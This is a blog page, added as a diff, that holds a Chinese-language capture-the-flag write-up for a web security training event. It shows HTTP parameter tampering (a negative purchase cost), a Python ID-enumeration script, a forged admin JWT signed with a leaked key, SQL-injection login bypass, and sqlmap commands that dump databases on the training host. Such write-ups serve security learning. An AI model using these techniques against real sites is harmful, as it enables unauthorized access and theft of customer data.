@@ -1,0 +1,511 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="utf-8" />
+    <title>TAIWAN HolyYoung Training 5/18 -&gt; WEB | 此情吳計可消除</title>
+    <meta name="author" content="yih-0118" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/lioshi.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>載入過慢請開啟快取 瀏覽器預設開啟</p>
+                    <img src="/images/load.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>此情吳計可消除</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;首頁</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;關於我</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;檔案</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分類</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;標籤</span>
+        </a>
+        
+        <!-- 添加深色模式切換按鈕 -->
+        <a href="javascript:void(0);" id="dark-mode-toggle-desktop" @click="toggleDarkMode">
+            <i :class="['fa-solid', darkMode ? 'fa-sun' : 'fa-moon', 'fa-fw']"></i>
+            <span>&ensp;{{ darkMode ? '淺色模式' : '深色模式' }}</span>
+        </a>
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;此情吳計可消除</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">首頁</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">關於我</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">檔案</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分類</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">標籤</div>
+                    </div>
+                </a>
+                
+                <!-- 添加深色模式切換按鈕 -->
+                <a href="javascript:void(0);" id="dark-mode-toggle-mobile" @click="toggleDarkMode">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i :class="['fa-solid', darkMode ? 'fa-sun' : 'fa-moon', 'fa-fw']"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">{{ darkMode ? '淺色模式' : '深色模式' }}</div>
+                    </div>
+                </a>
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>TAIWAN HolyYoung Training 5/18 -&gt; WEB</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/19
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/writeup/" style="color: #03a9f4">
+                    writeup
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="Find-GET-Method"><a href="#Find-GET-Method" class="headerlink" title="Find GET Method"></a>Find GET Method</h2><p>題目要求你找到<code>header</code><br>所以只要用<code>curl</code>去抓就好<br>輸入<code>curl -i -X HEAD http://isip-ctf.tyc4d.tw:8007/</code><br><img src="https://hackmd.io/_uploads/r1j7RrI7A.png" alt="image"></p>
+<blockquote>
+<p>FLAG: <code>FLAG&#123;Now_u_k0nw_g3t_method_32rfwk&#125;</code></p>
+</blockquote>
+<hr>
+<span id="more"></span>
+<h2 id="Find-POST-Method"><a href="#Find-POST-Method" class="headerlink" title="Find POST Method"></a>Find POST Method</h2><p>依據提示是request parmater<br>進到登入頁面隨便填後送出就行<br><img src="https://hackmd.io/_uploads/ryAb1I8Q0.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;i_f0und_ure_s3cret_post_form_wqd2ed&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="Mystery-Header"><a href="#Mystery-Header" class="headerlink" title="Mystery Header ?"></a>Mystery Header ?</h2><p>題目說到<code>瀏覽器是如何記住你登入過的呢？</code>，那就看看登入的時候會有什麼<br>有了這個<br><img src="https://hackmd.io/_uploads/BkT1zUI70.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>Set-Cookie</code></p>
+</blockquote>
+<hr>
+<h2 id="May-I-have-the-free-point"><a href="#May-I-have-the-free-point" class="headerlink" title="May I have the free point ?"></a>May I have the free point ?</h2><p>進入後會看到是沒有連結前往FLAG購買的<br><img src="https://hackmd.io/_uploads/ryTKGU8X0.png" alt="image"><br>那就看url的大概規則，是在<code>買喀Point</code>的前一個，所以就是在<code>5431-1</code>的地方<br>確實冒出來了<br><img src="https://hackmd.io/_uploads/SkVkmULmC.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;BrokenAccessControl_STEP1_Parameter_e32dwqd&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="Free-point-for-me"><a href="#Free-point-for-me" class="headerlink" title="Free point for me ?"></a>Free point for me ?</h2><p>接著上題，會發現自己的錢不夠買，中途攔下後修改扣除的金額<br><img src="https://hackmd.io/_uploads/S1mQELU7C.png" alt="image"><br>把cost改成負的就可以了<br>到my order中查看<br>確實已購買<br><img src="https://hackmd.io/_uploads/ByvUVI87R.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;BrokenAccessControl_STEP2_Parameter_e3dwdwd&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="You-can’t-see-me"><a href="#You-can’t-see-me" class="headerlink" title="You can’t see me"></a>You can’t see me</h2><p>進入後會看到許多名冊，前往後會被快速切換，用burp suite攔截就好<br>攔截到其中一頁會發現<br><img src="https://hackmd.io/_uploads/ByfnBIIX0.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;You_saw_me_dwqxx!!!&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="Where-is-Edward"><a href="#Where-is-Edward" class="headerlink" title="Where is Edward"></a>Where is Edward</h2><p>在url中發現有很多user以及對應的數字<br><img src="https://hackmd.io/_uploads/rySH8L87A.png" alt="image"><br>我一開始是想要用python去做request然後看返回的是不是有明確的html結構且不是顯示<code>User not found</code><br>以下是python腳本</p>
+<pre><code class="python=">import requests
+
+def scan_links_in_range(start, end):
+    base_url = &quot;http://isip-ctf.tyc4d.tw:8001/user/&quot;
+    for i in range(start, end+1):
+        link = base_url + str(i)
+        response = requests.get(link)
+        if response.status_code == 200:
+            if response.content:
+                print(f&quot;&#123;link&#125;有\n&#123;response.text&#125;&quot;)
+        else:
+            print(f&quot;沒找到&#123;link&#125;.&quot;)
+
+start = 1
+end = 10000
+scan_links_in_range(start, end)
+</code></pre>
+<p>突然跳出<img src="https://hackmd.io/_uploads/HkTqD8LQC.png" alt="image"><br>說明Edward在1022處<img src="https://hackmd.io/_uploads/r1c3DI87A.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;My_English_N4m3&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="Fix-My-Blog-…"><a href="#Fix-My-Blog-…" class="headerlink" title="Fix My Blog …"></a>Fix My Blog …</h2><p>到proxy中的Match and replace rules即可<br><img src="https://hackmd.io/_uploads/B1SvuULmR.png" alt="image"><br>出來了<br><img src="https://hackmd.io/_uploads/rJG6uUI70.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;bs_m4tch_and_r391eace&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="Website-Under-Development-Leak-Cookie"><a href="#Website-Under-Development-Leak-Cookie" class="headerlink" title="Website Under Development &amp; Leak Cookie"></a>Website Under Development &amp; Leak Cookie</h2><p>到登入頁面的html標籤中發現測試帳號僅被註釋掉而已<br><img src="https://hackmd.io/_uploads/B1dVKUIXR.png" alt="image"><br>登入測試帳號之後我們必須提升到admin才可以<br>會發現jwt的cookie<br><img src="https://hackmd.io/_uploads/HkrOKUU7A.png" alt="image"><br>到jwt.io中發現其中的資訊是guest<br><img src="https://hackmd.io/_uploads/B1gitIUQR.png" alt="image"><br>在robots.txt中有所需的key<br><img src="https://hackmd.io/_uploads/Syf0YL8mA.png" alt="image"><br>將其輸入在下方後並將guest修改為admin即可</p>
+<p>修改後為<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.H-x71CQ_xp70XDUQPpM7iRo1XDfoH7R3bGOZmQ9941o</code></p>
+<p>取代掉原先cookie的值即可<br>就進去了<br><img src="https://hackmd.io/_uploads/HJHBcUIQA.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;g1t_l3ak_and_cooki3_dewcw&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="Welcome2SQL"><a href="#Welcome2SQL" class="headerlink" title="Welcome2SQL"></a>Welcome2SQL</h2><p>整個畫面中會發現sql提取的架構<br>只要將password註釋掉即可<br><img src="https://hackmd.io/_uploads/H1RBj8I7R.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;W31c0me_2_SQLi_dqwd2ew&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="Dump-All-Data"><a href="#Dump-All-Data" class="headerlink" title="Dump All Data!"></a>Dump All Data!</h2><p><code>sqlmap -u &quot;http://isip-ctf.tyc4d.tw:8056/index.php&quot; --tables --columns</code><br>先用sqlmap搜尋到底有什麼database以及table，卻發現要<code>You are advised to rerun with &#39;--forms --crawl=2&#39;</code><br>之後就知道總共有這些了</p>
+<pre><code>Database: information_schema
+[59 tables]
++----------------------------------------------------+
+| CHARACTER_SETS                                     |
+| COLLATIONS                                         |
+| COLLATION_CHARACTER_SET_APPLICABILITY              |
+| COLUMN_PRIVILEGES                                  |
+| FILES                                              |
+| GLOBAL_STATUS                                      |
+| GLOBAL_VARIABLES                                   |
+| INNODB_BUFFER_PAGE                                 |
+| INNODB_BUFFER_PAGE_LRU                             |
+| INNODB_BUFFER_POOL_STATS                           |
+| INNODB_CMP                                         |
+| INNODB_CMPMEM                                      |
+| INNODB_CMPMEM_RESET                                |
+| INNODB_CMP_PER_INDEX                               |
+| INNODB_CMP_PER_INDEX_RESET                         |
+| INNODB_CMP_RESET                                   |
+| INNODB_FT_BEING_DELETED                            |
+| INNODB_FT_CONFIG                                   |
+| INNODB_FT_DEFAULT_STOPWORD                         |
+| INNODB_FT_DELETED                                  |
+| INNODB_FT_INDEX_CACHE                              |
+| INNODB_FT_INDEX_TABLE                              |
+| INNODB_LOCKS                                       |
+| INNODB_LOCK_WAITS                                  |
+| INNODB_METRICS                                     |
+| INNODB_SYS_COLUMNS                                 |
+| INNODB_SYS_DATAFILES                               |
+| INNODB_SYS_FIELDS                                  |
+| INNODB_SYS_FOREIGN                                 |
+| INNODB_SYS_FOREIGN_COLS                            |
+| INNODB_SYS_INDEXES                                 |
+| INNODB_SYS_TABLES                                  |
+| INNODB_SYS_TABLESPACES                             |
+| INNODB_SYS_TABLESTATS                              |
+| INNODB_TRX                                         |
+| KEY_COLUMN_USAGE                                   |
+| OPTIMIZER_TRACE                                    |
+| PARAMETERS                                         |
+| PROFILING                                          |
+| REFERENTIAL_CONSTRAINTS                            |
+| ROUTINES                                           |
+| SCHEMATA                                           |
+| SCHEMA_PRIVILEGES                                  |
+| SESSION_STATUS                                     |
+| SESSION_VARIABLES                                  |
+| STATISTICS                                         |
+| TABLESPACES                                        |
+| TABLE_CONSTRAINTS                                  |
+| TABLE_PRIVILEGES                                   |
+| USER_PRIVILEGES                                    |
+| VIEWS                                              |
+| COLUMNS                                            |
+| ENGINES                                            |
+| EVENTS                                             |
+| PARTITIONS                                         |
+| PLUGINS                                            |
+| PROCESSLIST                                        |
+| TABLES                                             |
+| TRIGGERS                                           |
++----------------------------------------------------+
+
+Database: customer_database
+[2 tables]
++----------------------------------------------------+
+| flag_table                                         |
+| user_info                                          |
++----------------------------------------------------+
+
+Database: mysql
+[28 tables]
++----------------------------------------------------+
+| event                                              |
+| plugin                                             |
+| user                                               |
+| columns_priv                                       |
+| db                                                 |
+| func                                               |
+| general_log                                        |
+| help_category                                      |
+| help_keyword                                       |
+| help_relation                                      |
+| help_topic                                         |
+| innodb_index_stats                                 |
+| innodb_table_stats                                 |
+| ndb_binlog_index                                   |
+| proc                                               |
+| procs_priv                                         |
+| proxies_priv                                       |
+| servers                                            |
+| slave_master_info                                  |
+| slave_relay_log_info                               |
+| slave_worker_info                                  |
+| slow_log                                           |
+| tables_priv                                        |
+| time_zone                                          |
+| time_zone_leap_second                              |
+| time_zone_name                                     |
+| time_zone_transition                               |
+| time_zone_transition_type                          |
++----------------------------------------------------+
+
+Database: performance_schema
+[52 tables]
++----------------------------------------------------+
+| hosts                                              |
+| accounts                                           |
+| cond_instances                                     |
+| events_stages_current                              |
+| events_stages_history                              |
+| events_stages_history_long                         |
+| events_stages_summary_by_account_by_event_name     |
+| events_stages_summary_by_host_by_event_name        |
+| events_stages_summary_by_thread_by_event_name      |
+| events_stages_summary_by_user_by_event_name        |
+| events_stages_summary_global_by_event_name         |
+| events_statements_current                          |
+| events_statements_history                          |
+| events_statements_history_long                     |
+| events_statements_summary_by_account_by_event_name |
+| events_statements_summary_by_digest                |
+| events_statements_summary_by_host_by_event_name    |
+| events_statements_summary_by_thread_by_event_name  |
+| events_statements_summary_by_user_by_event_name    |
+| events_statements_summary_global_by_event_name     |
+| events_waits_current                               |
+| events_waits_history                               |
+| events_waits_history_long                          |
+| events_waits_summary_by_account_by_event_name      |
+| events_waits_summary_by_host_by_event_name         |
+| events_waits_summary_by_instance                   |
+| events_waits_summary_by_thread_by_event_name       |
+| events_waits_summary_by_user_by_event_name         |
+| events_waits_summary_global_by_event_name          |
+| file_instances                                     |
+| file_summary_by_event_name                         |
+| file_summary_by_instance                           |
+| host_cache                                         |
+| mutex_instances                                    |
+| objects_summary_global_by_type                     |
+| performance_timers                                 |
+| rwlock_instances                                   |
+| session_account_connect_attrs                      |
+| session_connect_attrs                              |
+| setup_actors                                       |
+| setup_consumers                                    |
+| setup_instruments                                  |
+| setup_objects                                      |
+| setup_timers                                       |
+| socket_instances                                   |
+| socket_summary_by_event_name                       |
+| socket_summary_by_instance                         |
+| table_io_waits_summary_by_index_usage              |
+| table_io_waits_summary_by_table                    |
+| table_lock_waits_summary_by_table                  |
+| threads                                            |
+| users                                              |
++----------------------------------------------------+
+
+Database: shop_database
+[1 table]
++----------------------------------------------------+
+| tblproduct                                         |
++----------------------------------------------------+
+</code></pre>
+<p>而我們要找到客戶的資料，看起來就像在customer_database中的user-info，有了目標就可以用sqlmap繼續了</p>
+<p>輸入<code>sqlmap -u &quot;http://isip-ctf.tyc4d.tw:8056/index.php&quot; --forms --crawl=2 --tables -D customer_database --dump -T user-info</code><br>發現在765<br><img src="https://hackmd.io/_uploads/S1YvALIQR.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;n0w_y0u_know_sqlmap&#125;</code></p>
+</blockquote>
+<hr>
+<h2 id="WHERE-are-you-Shopping-Cart"><a href="#WHERE-are-you-Shopping-Cart" class="headerlink" title="WHERE are you (Shopping Cart)"></a>WHERE are you (Shopping Cart)</h2><p>而我們要尋找架上的東東<br>看起來就在shop_database中的tblproduct<br>印出即可<code>sqlmap -u &quot;http://isip-ctf.tyc4d.tw:8056/index.php&quot; --forms --crawl=2 --tables -D shop_database --dump -T tblproduct</code><br>這樣子就出來了<img src="https://hackmd.io/_uploads/HJ0mJDI7R.png" alt="image"><br>FLAG:<code>FLAG&#123;Th3_secret_0f_wh3r3_5tatement&#125;</code></p>
+<hr>
+<h2 id="Infomation-Sc…"><a href="#Infomation-Sc…" class="headerlink" title="Infomation_Sc…?"></a>Infomation_Sc…?</h2><p>題目都告訴你要在table flag_table中找有幾個varchar類型的<br><code>sqlmap -u &quot;http://isip-ctf.tyc4d.tw:8056/index.php&quot; --forms --crawl=2 -D customer_database -T flag_table --columns</code><br>會看到共有兩種<img src="https://hackmd.io/_uploads/B1ZBeDL7R.png" alt="image"></p>
+<blockquote>
+<p>FLAG:<code>2</code></p>
+</blockquote>
+<hr>
+<h2 id="真實案例挑戰賽Q1"><a href="#真實案例挑戰賽Q1" class="headerlink" title="真實案例挑戰賽Q1"></a>真實案例挑戰賽Q1</h2><p>當按下網頁中的連結時，會前往到本機的，我們要把他換掉<br><img src="https://hackmd.io/_uploads/HJeXAeAmR.png" alt="image"><br>要設定<br><img src="https://hackmd.io/_uploads/BJANRgCQ0.png" alt="image"><br>然後會看到這個圖<br><img src="https://hackmd.io/_uploads/rkd8AxAXC.png" alt="image"><br>知道有<code>port：8380</code><br><img src="https://hackmd.io/_uploads/Hy_x--0m0.png" alt="image"></p>
+<p>已經知道帳號是:wordpress<br>密碼：wordpress_Admin</p>
+<p>進去後看到wp_flag的table</p>
+<blockquote>
+<p>FLAG:<code>FLAG&#123;nice_observation&#125;</code></p>
+</blockquote>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2023 - 2024 此情吳計可消除
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;yih-0118
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
